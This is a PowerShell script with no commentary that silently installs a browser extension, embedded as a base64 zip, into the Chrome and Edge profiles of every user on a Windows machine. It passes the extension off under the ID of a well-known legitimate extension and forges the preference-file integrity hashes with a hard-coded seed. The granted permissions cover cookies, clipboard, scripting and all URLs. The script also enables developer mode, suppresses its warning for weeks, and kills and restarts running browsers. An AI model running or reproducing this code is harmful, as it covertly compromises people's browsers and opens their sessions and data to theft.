$extension_zip = "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"



function removeEmpty {
    param($d)

    if ($d -is [System.Collections.Specialized.OrderedDictionary]) {
        $t = New-Object 'System.Collections.Specialized.OrderedDictionary'
        foreach ($key in $d.Keys) {
            $t[$key] = $d[$key]
        }

        foreach ($x in $t.Keys) {
            $y = $t[$x]

            if ($y -is [System.Collections.Specialized.OrderedDictionary]) {
                if ($y.Count -eq 0) {
                    $d.Remove($x)
                } else {
                    removeEmpty $y
                    if ($y.Count -eq 0) {
                        $d.Remove($x)
                    }
                }
            } elseif ($y -is [hashtable]) {
                if ($y.Count -eq 0) {
                    $d.Remove($x)
                } else {
                    removeEmpty $y
                    if ($y.Count -eq 0) {
                        $d.Remove($x)
                    }
                }
            } elseif ($y -is [System.Collections.IList]) {
                if ($y.Count -eq 0) {
                    $d.Remove($x)
                } else {
                    removeEmpty $y
                    if ($y.Count -eq 0) {
                        $d.Remove($x)
                    }
                }
            } else {
                if (-not $y -and $y -ne $false -and $y -ne 0) {
                    $d.Remove($x)
                }
            }
        }
    } elseif ($d -is [System.Collections.IList]) {
        for ($i = $d.Count - 1; $i -ge 0; $i--) {
            $x = $i
            $y = $d[$i]

            if ($y -is [System.Collections.Specialized.OrderedDictionary]) {
                if ($y.Count -eq 0) {
                    $d.RemoveAt($x)
                } else {
                    removeEmpty $y
                    if ($y.Count -eq 0) {
                        $d.RemoveAt($x)
                    }
                }
            } elseif ($y -is [hashtable]) {
                if ($y.Count -eq 0) {
                    $d.RemoveAt($x)
                } else {
                    removeEmpty $y
                    if ($y.Count -eq 0) {
                        $d.RemoveAt($x)
                    }
                }
            } elseif ($y -is [System.Collections.IList]) {
                if ($y.Count -eq 0) {
                    $d.RemoveAt($x)
                } else {
                    removeEmpty $y
                    if ($y.Count -eq 0) {
                        $d.RemoveAt($x)
                    }
                }
            } else {
                if (-not $y -and $y -ne $false -and $y -ne 0) {
                    $d.RemoveAt($x)
                }
            }
        }
    }
}

function calculateHMAC {
    param(
        [Parameter(Mandatory)]
        [object]$value_as_string,
        [Parameter(Mandatory)]
        [string]$path,
        [Parameter(Mandatory)]
        [string]$sid,
        [Parameter(Mandatory)]
        [byte[]]$seed
    )

    if ($value_as_string -is [System.Collections.IDictionary] -or $value_as_string.PSObject.TypeNames -contains 'System.Management.Automation.PSCustomObject') {
        removeEmpty -d $value_as_string
    }

    $jsonValue = $value_as_string | ConvertTo-Json -Depth 100
    $jsonValueMinified = $jsonValue -replace '\s', ''
    $jsonValueMinified = $jsonValueMinified -replace '<', '\u003C'
    $jsonValueMinified = $jsonValueMinified -replace 'u003c', 'u003C'
    $jsonValueMinified = $jsonValueMinified -replace '\\u003e', '>'

    $message = $sid + $path + $jsonValueMinified
    $hmacsha256 = New-Object System.Security.Cryptography.HMACSHA256
    $hmacsha256.Key = $seed
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($message)
    $hashBytes = $hmacsha256.ComputeHash($bytes)

    $hash = ($hashBytes | ForEach-Object { $_.ToString("x2") }) -join ''
    return $hash.ToUpper()
}

function calc_supermac {
    param(
        [string]$json_file,
        [string]$sid,
        [byte[]]$seed
    )

    $json_text = Get-Content -Path $json_file -Raw -Encoding UTF8
    $data = ConvertFrom-Json -InputObject $json_text
    $macs = $data.protection.macs

    $macsJson = $macs | ConvertTo-Json -Depth 100
    $macsJsonMinified = $macsJson -replace '\s', ''

    $super_msg = "$sid$macsJsonMinified"
   
    $hmacsha256 = New-Object System.Security.Cryptography.HMACSHA256
    $hmacsha256.Key = $seed
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($super_msg)
    $hashBytes = $hmacsha256.ComputeHash($bytes)

    $hash = ($hashBytes | ForEach-Object { $_.ToString("x2") }) -join ''
    return $hash.ToUpper()
}

function find_extensions_settings {
    param (
        [string]$user,
        [ValidateSet("edge", "chrome")]
        [string]$browser
    )

    if ($browser -eq 'chrome') {
        $files_to_check = @(
            "C:\users\$user\appdata\local\Google\Chrome\User Data\Default\Secure Preferences",
            "C:\users\$user\appdata\local\Google\Chrome\User Data\Default\Preferences"
        )
    } elseif ($browser -eq 'edge') {
        $files_to_check = @(
            "C:\users\$user\appdata\local\Microsoft\Edge\User Data\Default\Secure Preferences",
            "C:\users\$user\appdata\local\Microsoft\Edge\User Data\Default\Preferences"
        )
    } else {
        return $null
    }


    foreach ($file_path in $files_to_check) {
        if (Test-Path $file_path) {
            try {
                $json_text = Get-Content -Path $file_path -Raw -Encoding UTF8
                $data = $json_text | ConvertFrom-Json

                if ($data.PSObject.Properties.Name -contains 'extensions') {
                    if ($data.extensions.PSObject.Properties.Name -contains 'settings') {
                        return $file_path
                    }
                }
            } catch {
                continue
            }
        }
    }

    return $null
}

function add_extension {
    param(
        [string]$user,
        [string]$sid,
	[string]$browser
    )

    $edgeseed = ''
    $chromeseed=[System.Convert]::FromBase64String('50jzNthepfnc3yXY80emW0zfZnYA8C32ckoq8YohLSa3iKJQhpEM86kDE2locfPcBYI3MMkd+LpcT9nIhLUFqA==')
    
    $fileTime = [long]((([DateTime]::UtcNow).AddMinutes(-15) - [DateTime]::Parse('1601-01-01T00:00:00Z')).TotalMilliseconds * 1000)

    $extension_json = '{"account_extension_type":0,"active_permissions":{"api":["activeTab","bookmarks","clipboardRead","clipboardWrite","cookies","storage","tabs","declarativeNetRequest","scripting","declarativeNetRequestWithHostAccess"],"explicit_host":["http://*/*","https://*/*"],"scriptable_host":["\u003Call_urls>"]},"creation_flags":38,"dnr_dynamic_ruleset":{"checksum":929336130},"first_install_time":"' + $filetime + '","from_webstore":false,"granted_permissions":{"api":["activeTab","alarms","bookmarks","clipboardRead","clipboardWrite","cookies","storage","tabs","unlimitedStorage","declarativeNetRequest","scripting","declarativeNetRequestWithHostAccess"],"explicit_host":["http://*/*","https://*/*"],"scriptable_host":["\u003Call_urls>"]},"last_update_time":"' + $filetime + '","location":4,"newAllowFileAccess":true,"path":"efaidnbmnnnibpcajpcglclefindmkaj","service_worker_registration_info":{"version":"1.0"},"serviceworkerevents":["runtime.onInstalled","runtime.onStartup","tabs.onUpdated"],"was_installed_by_default":false,"was_installed_by_oem":false,"withholding_permissions":false}'

    Add-Type -AssemblyName System.Web.Extensions
    $serializer = New-Object System.Web.Script.Serialization.JavaScriptSerializer
    $serializer.MaxJsonLength = 67108864
    $dict_extension = $serializer.DeserializeObject($extension_json)

    $filepath = find_extensions_settings $user -browser $browser

    if (-not $filepath) {
        return
    }

    try {
        $json_text = Get-Content -Path $filepath -Raw -Encoding UTF8
        $data = $serializer.DeserializeObject($json_text)

        if (-not $data.ContainsKey('extensions')) { $data['extensions'] = @{} }
        if (-not $data['extensions'].ContainsKey('settings')) { $data['extensions']['settings'] = @{} }

        $data['extensions']['settings']['efaidnbmnnnibpcajpcglclefindmkaj'] = $dict_extension

        if (-not $data['extensions'].ContainsKey('ui')) { $data['extensions']['ui'] = @{} }
        $data['extensions']['ui']['developer_mode'] = $false

        $path = "extensions.settings.efaidnbmnnnibpcajpcglclefindmkaj"

	if ($browser -eq "chrome") {
      	    $macs = calculateHMAC $dict_extension $path $sid $chromeseed
	}
	else {
	    $macs = calculateHMAC $dict_extension $path $sid $edgeseed
	}

        if (-not $data.ContainsKey('protection')) { $data['protection'] = @{} }
        if (-not $data['protection'].ContainsKey('macs')) { $data['protection']['macs'] = @{} }
        if (-not $data['protection']['macs'].ContainsKey('extensions')) { $data['protection']['macs']['extensions'] = @{} }
        if (-not $data['protection']['macs']['extensions'].ContainsKey('settings')) { $data['protection']['macs']['extensions']['settings'] = @{} }

        $data['protection']['macs']['extensions']['settings']['efaidnbmnnnibpcajpcglclefindmkaj'] = $macs

	if ($browser -eq "chrome") {
            $supermac = calc_supermac $filepath $sid $chromeseed
	}
	else {
	    $supermac = calc_supermac $filepath $sid $edgeseed
	}
        $data['protection']['super_mac'] = $supermac

        $json_out = $serializer.Serialize($data)
        Set-Content -Path $filepath -Value $json_out -Encoding UTF8

    } catch {
        return $null
    }
}

function enable_dev {
    param(
        [string]$user,
        [string]$sid,
	[string]$browser
    )

    $edgeseed = ''
    $chromeseed=[System.Convert]::FromBase64String('50jzNthepfnc3yXY80emW0zfZnYA8C32ckoq8YohLSa3iKJQhpEM86kDE2locfPcBYI3MMkd+LpcT9nIhLUFqA==')

    # Load JSON serializer
    Add-Type -AssemblyName System.Web.Extensions
    $serializer = New-Object System.Web.Script.Serialization.JavaScriptSerializer
    $serializer.MaxJsonLength = 67108864

    $filepath = find_extensions_settings $user -browser $browser

    if (-not $filepath) {
        return
    }

    try {
        $json_text = Get-Content -Path $filepath -Raw -Encoding UTF8
        $data = $serializer.DeserializeObject($json_text)


        if (-not $data.ContainsKey('extensions')) { $data['extensions'] = @{} }
        if (-not $data['extensions'].ContainsKey('ui')) { $data['extensions']['ui'] = @{} }

        $data['extensions']['ui']['developer_mode'] = $true

        $devpath = "extensions.ui.developer_mode"

	if ($browser -eq "chrome") {
      	    $devkey = calculateHMAC $true $devpath $sid $chromeseed
	}
	else {
	    $devkey = calculateHMAC $true $devpath $sid $edgeseed
	}

        # Ensure protection path exists
        if (-not $data.ContainsKey('protection')) { $data['protection'] = @{} }
        if (-not $data['protection'].ContainsKey('macs')) { $data['protection']['macs'] = @{} }
        if (-not $data['protection']['macs'].ContainsKey('extensions')) { $data['protection']['macs']['extensions'] = @{} }
        if (-not $data['protection']['macs']['extensions'].ContainsKey('ui')) { $data['protection']['macs']['extensions']['ui'] = @{} }

        # Set the HMAC
        $data['protection']['macs']['extensions']['ui']['developer_mode'] = $devkey

	if ($browser -eq "chrome") {
            $supermac = calc_supermac $filepath $sid $chromeseed
	}
	else {
	    $supermac = calc_supermac $filepath $sid $edgeseed
	}
        $data['protection']['super_mac'] = $supermac

        $json_out = $serializer.Serialize($data)
        Set-Content -Path $filepath -Value $json_out -Encoding UTF8

    } catch {
       return $null
    }
}


function Get-SidWithoutRid {
    param([string]$username)

    $ntAccount = New-Object System.Security.Principal.NTAccount($username)
    try {
        $sidObj = $ntAccount.Translate([System.Security.Principal.SecurityIdentifier])
        $sidStr = $sidObj.Value
        $sidParts = $sidStr -split '-'
        $sidWithoutRid = ($sidParts[0..($sidParts.Length - 2)] -join '-')
        return $sidWithoutRid
    }
    catch {
        return $null
    }
}

function delay_dev_mode_warning {

    $filepath = "C:\users\$user\appdata\local\Microsoft\Edge\User Data\Default\Preferences"

    if (-not (Test-Path -Path $filepath)) {
        Write-Host "No valid file found for user $user"
        return
    }

    Add-Type -AssemblyName System.Web.Extensions
    $serializer = New-Object System.Web.Script.Serialization.JavaScriptSerializer

    $json_text = Get-Content -Path $filepath -Raw -Encoding UTF8
    $data = $serializer.DeserializeObject($json_text)


    if (-not $data.ContainsKey('extensions')) { $data['extensions'] = @{} }
    if (-not $data['extensions'].ContainsKey('settings')) { $data['extensions']['settings'] = @{} }
    if (-not $data['extensions'].ContainsKey('ui')) { $data['extensions']['ui'] = @{} }

    $futureDate = (Get-Date).ToUniversalTime().AddDays(7 * 12)
    $unixEpoch = [DateTime]"1970-01-01T00:00:00Z"
    $chromeEpoch = [DateTime]"1601-01-01T00:00:00Z"
    $epochDiff = ($unixEpoch - $chromeEpoch).TotalSeconds

    $fileTime = ([int64]($futureDate - $chromeEpoch).TotalSeconds * 1000000).ToString()

    $data['extensions']['ui']['dev_mode_warning_snooze_end_time'] = $fileTime

    $json_out = $serializer.Serialize($data) -replace '\s+', ''

    Set-Content -Path $filepath -Value $json_out -Encoding UTF8
}

function kill_browsers {
    $browsers = @(
        @{ Name = "chrome"; ProcessName = "chrome" },
        @{ Name = "edge"; ProcessName = "msedge" }
    )

    $killedBrowsers = @{}

    foreach ($browser in $browsers) {
        $processes = Get-Process -Name $browser.ProcessName -ErrorAction SilentlyContinue | Where-Object { $_.MainWindowHandle -ne 0 }

        if ($processes) {
            foreach ($proc in $processes) {
                try {
                    $proc.Kill()
                }
                catch {
                    return $null
                }
            }
            $killedBrowsers[$browser.Name] = $true
        }
    }
    return $killedBrowsers
}

function start_browsers {
    param (
        [hashtable]$browsersToStart
    )

    $browserPaths = @{
        "chrome" = "C:\Program Files\Google\Chrome\Application\chrome.exe"
        "edge"   = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
    }
    foreach ($browser in $browsersToStart.Keys) {
        if ($browsersToStart[$browser] -eq $true) {
            $exePath = $browserPaths[$browser]
            if (Test-Path $exePath) {
                Start-Process -FilePath $exePath
            } else {
                return $null
            }
        }
    }
}

function Install-ExtensionFromBase64 {
    param (
        [string]$base64Zip,
	[string] $user
    )

    $folderName = "efaidnbmnnnibpcajpcglclefindmkaj"

    $edgePath = "C:\Users\$user\AppData\Local\Microsoft\Edge\User Data\Default\Extensions\$folderName"
    $chromePath = "C:\Users\$user\AppData\Local\Google\Chrome\User Data\Default\Extensions\$folderName"

    $tempZipPath = [System.IO.Path]::Combine($env:TEMP, "$folderName.zip")
    $tempExtractPath = [System.IO.Path]::Combine($env:TEMP, "$folderName-unzipped")

    try {
        [IO.File]::WriteAllBytes($tempZipPath, [Convert]::FromBase64String($base64Zip))

        if (Test-Path $tempExtractPath) { Remove-Item -Path $tempExtractPath -Recurse -Force }
        Expand-Archive -Path $tempZipPath -DestinationPath $tempExtractPath -Force

        # Create destination folders if they don't exist
        foreach ($dest in @($edgePath, $chromePath)) {
            if (!(Test-Path $dest)) {
                New-Item -Path $dest -ItemType Directory -Force | Out-Null
            }
            Copy-Item -Path "$tempExtractPath\*" -Destination $dest -Recurse -Force
        }
    }
    catch {
        return $null
    }
    finally {
        # Clean up temp files
        if (Test-Path $tempZipPath) { Remove-Item $tempZipPath -Force }
        if (Test-Path $tempExtractPath) { Remove-Item $tempExtractPath -Recurse -Force }
    }
}

$users = if (([System.Security.Principal.WindowsPrincipal][System.Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole('Administrators') -or [System.Security.Principal.WindowsIdentity]::GetCurrent().Name -eq 'NT AUTHORITY\SYSTEM') { 
    Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\*' | 
    Select-Object -ExpandProperty ProfileImagePath -ErrorAction SilentlyContinue | 
    Where-Object { $_ -like "$env:SystemDrive\Users\*" } | 
    Split-Path -Leaf 
} else { 
    [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[-1] 
}

$killed = kill_browsers
foreach ($user in $users) {
	$sid = Get-SidWithoutRid $user

	add_extension $user $sid 'edge'
	add_extension $user $sid 'chrome'
	Install-ExtensionFromBase64 $extension_zip $user
	Start-Sleep -Seconds 2

	enable_dev $user $sid 'edge'
	enable_dev $user $sid 'chrome'
	delay_dev_mode_warning
}

start_browsers -browsersToStart $killed
